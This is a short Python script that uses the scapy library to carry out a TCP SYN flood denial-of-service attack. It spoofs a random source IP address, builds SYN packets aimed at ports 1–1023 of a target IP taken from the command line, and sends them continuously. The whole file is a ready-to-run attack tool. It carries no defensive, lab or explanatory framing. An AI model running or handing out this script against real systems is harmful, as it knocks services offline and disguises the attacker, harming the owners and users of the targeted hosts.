import random
import scapy.all
import sys

def getRandomIP():
	return "{}.{}.{}.{}".format(*[random.getrandbits(8) for i in range(4)])

def synAttack(targetip):
	srcip = getRandomIP()
	P_IP = scapy.all.IP(src=srcip, dst=targetip)
	P_TCP = scapy.all.TCP(dport=scapy.all.range(1,1024), flags='S')
	packet = P_IP/P_TCP
	#scapy.all.srflood(packet, store=0)
	scapy.all.srflood(packet)

def printUsageAndExit():
	print('Usage: python {} <target ip>'.format(sys.argv[0]))
	sys.exit(1)

if __name__ == '__main__':
	if len(sys.argv) != 2:
		printUsageAndExit()

	targetip = sys.argv[1]
	synAttack(targetip)